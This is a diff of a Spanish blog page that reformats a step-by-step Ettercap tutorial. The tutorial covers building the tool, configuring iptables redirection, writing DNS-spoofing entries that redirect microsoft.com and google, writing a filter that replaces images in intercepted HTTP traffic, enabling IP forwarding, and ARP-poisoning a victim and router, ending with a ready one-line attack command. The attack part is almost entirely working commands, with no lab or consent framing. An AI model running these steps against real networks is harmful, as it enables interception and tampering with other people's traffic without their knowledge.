@@ -94,7 +94,7 @@
   
 
 
-<time datetime="2013-12-15T18:36:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -107,119 +107,129 @@
 
 <p>descargar de http://ettercap.sourceforge.net/ y descomprimir</p>
 
-<blockquote><p>~$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
+<blockquote><p>$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
 
-<p>~$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
+<p>$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
 
-<p>~$ tar -zvxf paquete</p>
+<p>$ tar -zvxf paquete</p>
 
-<p>~$ cd ettercap-NG-0.7.3</p></blockquote>
+<p>$ cd ettercap-NG-0.7.3</p></blockquote>
 
-<p>$ ./configure</p>
+<pre><code>$ ./configure 
 
-<p>$ make</p>
+$ make 
 
-<h1>make install</h1>
+# make install 
+</code></pre>
 
-<blockquote><p>~$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
+<blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
 
 <p>modificar archivo de configuración:</p>
 
-<blockquote><p>~# nano /etc/etter.conf</p></blockquote>
+<blockquote><p># nano /etc/etter.conf</p></blockquote>
 
 <p>descomentar la linea:himne20-01-13 19:37Menos información</p>
 
-<blockquote><p>~# if you use iptables:</p></blockquote>
+<blockquote><p># if you use iptables:</p></blockquote>
 
 <p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
 
 <p>Y modificar:</p>
 
-<blockquote><p>~# the command used by the remote_browser plugin</p></blockquote>
+<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
 
 <p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
 
 <p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
 
-<blockquote><p>~# nano /usr/share/ettercap/etter.dns</p>
+<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
 
-<p>~# 3  Modos de especificar la redirección a localhost</p></blockquote>
+<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
 
-<p>microsoft.com          A       192.168.1.2</p>
+<pre><code>microsoft.com          A       192.168.1.2 
 
-<p>*.microsoft.com        A       192.168.1.2</p>
+*.microsoft.com        A       192.168.1.2 
 
-<p><em>google</em>               A       192.168.1.2</p>
+*google*               A       192.168.1.2
+</code></pre>
 
 <p>Para la sustitución de imagenes:</p>
 
-<blockquote><p>~# touch test2filter</p></blockquote>
+<blockquote><p># touch test2filter</p></blockquote>
 
 <p>Pegar:</p>
 
-<p>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</p>
+<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
 
-<p>replace(&#8220;img src=&#8221;, &#8220;img src=&#8221;http://www.irongeek.com/images/jollypwn.png&#8221; &#8220;);</p>
+replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
 
-<p>replace(&#8220;IMG SRC=&#8221;, &#8220;img src=&#8221;http://www.irongeek.com/images/jollypwn.png&#8221; &#8220;);</p>
+replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
 
-<p>msg(&#8220;Filter ok.n&#8221;);</p>
+msg("Filter ok.\n");
+</code></pre>
 
 <p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
 
-<blockquote><p>~# cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
+<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
 
 <p>Si la respuesta no es 1, lanzar:</p>
 
-<blockquote><p>~# echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
 
 <p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
 
-<blockquote><p>~# ettercap -C</p></blockquote>
+<blockquote><p># ettercap -C</p></blockquote>
 
 <p>Clicar en:</p>
 
-<p>Sniff -> Unifield sniffing</p>
+<pre><code>Sniff -&gt; Unifield sniffing 
+</code></pre>
 
 <p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
 
-<p>Host -> Scan for host</p>
+<pre><code>Host -&gt; Scan for host 
+</code></pre>
 
 <p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
 
-<p>Hosts -> Hosts List</p>
+<pre><code>Hosts -&gt; Hosts List 
+</code></pre>
 
 <p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
 
-<p>Mitm -> Arp poisoning</p>
+<pre><code>Mitm -&gt; Arp poisoning 
+</code></pre>
 
 <p>Parameters, ponemos:</p>
 
-<p>remote</p>
+<pre><code>remote
+</code></pre>
 
 <p>Y arrancamos el sniffer:</p>
 
-<p>Start -> Start sniffing</p>
+<pre><code>Start -&gt; Start sniffing 
 
-<p>Para observar las conexiones que realiza la máquina objetivo:</p>
+Para observar las conexiones que realiza la máquina objetivo: 
 
-<p>View -> Connections</p>
+View -&gt; Connections 
 
-<p>Para terminar el ataque:</p>
+Para terminar el ataque: 
 
-<p>Mitm -> Stop mitm atack</p>
+Mitm -&gt; Stop mitm atack 
 
-<p>Start -> Stop Sniffing</p>
+Start -&gt; Stop Sniffing 
 
-<p>Start -> Exit</p>
+Start -&gt; Exit
+</code></pre>
 
 <p>Forma abreviada:</p>
 
-<h1>ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router</h1>
+<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router 
 
-<p>O solo especificando la del router si se ataca toda la red:</p>
+O solo especificando la del router si se ataca toda la red: 
+</code></pre>
 
-<blockquote><p>~# ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
+<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
 </div>
 
 
@@ -242,7 +252,7 @@
   
 
 
-<time datetime="2013-12-15T18:36:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
       
 
 
@@ -274,9 +284,9 @@
   
     <section>
 <h1>Número de entradas</h1>
-        <ul>
-        <li>1354</li>
-        </ul>
+	<ul>
+	<li>1354</li>
+	</ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
